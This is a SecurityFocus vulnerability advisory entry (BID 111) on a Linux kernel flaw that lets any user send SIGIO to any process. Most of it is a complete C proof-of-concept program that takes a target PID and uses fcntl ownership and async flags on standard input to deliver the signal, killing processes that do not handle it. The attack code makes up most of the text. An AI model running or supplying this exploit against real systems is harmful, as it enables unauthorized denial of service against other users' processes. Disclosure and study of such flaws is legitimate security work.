source: http://www.securityfocus.com/bid/111/info

A vulnerability in the Linux kernel allows any user to send a SIGIO signal to any process. If the process does not catch or ignore the signal is will exit.

/* On non-glibc systems you must add
*
* #define O_ASYNC FASYNC
*/
#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
int s, p;

if(argc != 2) {
fputs("Please specify a pid to send signal to.\n", stderr);
exit(0);
} else {
p = atoi(argv[1]);
}
fcntl(0,F_SETOWN,p);
s = fcntl(0,F_GETFL,0);
fcntl(0,F_SETFL,s|O_ASYNC);
printf("Sending SIGIO - press enter.\n");
getchar();
fcntl(0,F_SETFL,s&~O_ASYNC);
printf("SIGIO send attempted.\n");
return 0;
}